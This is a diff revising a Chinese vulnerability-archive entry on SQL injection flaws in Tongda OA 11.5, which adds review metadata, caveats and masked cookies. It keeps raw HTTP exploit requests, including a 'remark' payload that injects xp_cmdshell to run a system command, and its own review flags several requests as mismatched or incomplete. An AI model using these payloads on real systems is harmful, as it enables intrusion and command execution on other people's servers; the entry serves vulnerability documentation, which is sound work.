@@ -1,10 +1,50 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "通达OA swfupload_new、file_folder、meetingreceipt SQL 注入集合"
+product: "通达OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "11.5实测"
+prerequisites: "swfupload声称未授权，其他请求有Cookie"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/RlOpohHvjHv_Qg3mNgDCAQ"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E7%BB%AD%E9%9B%86%20%20%20%E5%86%8D%E5%8F%91%E9%80%9A%E8%BE%BE%20OA%20%E5%A4%9A%E6%9E%9A%200day.md"
+category_recommendation: "OA / 通达"
+id: "vw-83614377e1d7f8591d5c9f7e"
+entity_id: "ve-83614377e1d7f8591d5c9f7e"
+schema_version: "1"
 ---
 
-# 续集   再发通达 OA 多枚 0day
+# 通达OA swfupload_new、file_folder、meetingreceipt SQL 注入集合
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：通达OA；swfupload_new、file_folder、meetingreceipt SQLi集合
+- 版本、配置及部署条件：11.5实测
+- 认证与权限前提：swfupload声称未授权，其他请求有Cookie
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 第1节multipart字段全丢；第2节CONTENT_ID_STR错配remark请求
+- 第3节头体无空行，xp_cmdshell为SQL Server语法，需核实际DB
+- 第2项仅报错和条件尝试，不应标完整利用；保留逐漏洞鉴权条件
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RlOpohHvjHv_Qg3mNgDCAQ)
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqczeflvHvDexuf2BhBEBYlJCdjJS6aVZ0w6ooY5QwK27L2khaJWEOVdw2kunkBTviakCv6QeGxYjHg/640?wx_fmt=png)  
@@ -18,13 +58,12 @@ source: "MrWQ/vulnerability-paper"
 **漏洞参数：**SORT_ID，FILE_SORT  
 **审计版本：**通达 OA 11.5
 
-```
+```http
 POST /general/file_folder/swfupload_new.php HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
 Referer: http://192.168.202.1/
 Connection: close
 Host: 192.168.202.1
-Content-Length: 391
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US
 Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
@@ -44,17 +83,18 @@ Content-Disposition: form-data;
 ------------GFioQpMK0vv2--
 ```
 
-```
+> 请求长度说明：原资料 Content-Length 为 391；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+
+```http
 POST /general/file_folder/api.php HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
 Referer: http://192.168.202.1/general/file_folder/public_folder.php?FILE_SORT=1&SORT_ID=59
 X-Resource-Type: xhr
-Cookie: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701
+Cookie: PHPSESSID=g************************7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701
 Connection: close
 Host: 192.168.202.1
 Pragma: no-cache
 x-requested-with: XMLHttpRequest
-Content-Length: 82
 x-wvs-id: Acunetix-Deepscan/209
 Cache-Control: no-cache
 accept: */*
@@ -64,6 +104,8 @@ content-type: application/x-www-form-urlencoded; charset=UTF-8
 
 CONTENT_ID_STR=222&SORT_ID=59&FILE_SORT=1&action=sign
 ```
+
+> 请求长度说明：原资料 Content-Length 为 82；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 看看下图，在我去掉 cookie 之后，发现一样能注入，我测试的 11.5 版本存在未授权也能注入。  
 
@@ -82,17 +124,16 @@ CONTENT_ID_STR=222&SORT_ID=59&FILE_SORT=1&action=sign
 **漏洞参数：**CONTENT_ID_STR  
 **审计版本：**通达 OA 11.5
 
-```
+```http
 POST /general/appbuilder/web/meeting/meetingmanagement/meetingreceipt HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
 Referer: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&id=5&nosign=true&reminding=true
 X-Resource-Type: xhr
-Cookie: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701
+Cookie: PHPSESSID=g************************7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701
 Connection: close
 Host: 192.168.202.1
 Pragma: no-cache
 x-requested-with: XMLHttpRequest
-Content-Length: 97
 x-wvs-id: Acunetix-Deepscan/186
 Cache-Control: no-cache
 accept: */*
@@ -102,6 +143,8 @@ content-type: application/x-www-form-urlencoded; charset=UTF-8
 
 m_id=5&join_flag=2&remark='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e10%2e1%2e255'--
 ```
+
+> 请求长度说明：原资料 Content-Length 为 97；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqcNGbibLvLMAyLEUTCdsTPhswH64n58RtCdDIc0zIhyQbuvk5aiaUcM7714yqkzh5y9sgkfg8yJvbnw/640?wx_fmt=png)
 
@@ -123,12 +166,12 @@ m_id=5&join_flag=2&remark='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e
 **漏洞参数：**remark  
 **审计版本：**通达 OA 11.5
 
-```
+```http
 POST /general/appbuilder/web/meeting/meetingmanagement/meetingreceipt HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
 Referer: http://192.168.202.1/general/meeting/myapply/details.php?affair=true&id=5&nosign=true&reminding=true
 X-Resource-Type: xhr
-Cookie: PHPSESSID=g1njm64pl94eietps80muet5d7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701
+Cookie: PHPSESSID=g************************7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=fab32701
 Connection: close
 Host: 192.168.202.1
 Pragma: no-cache
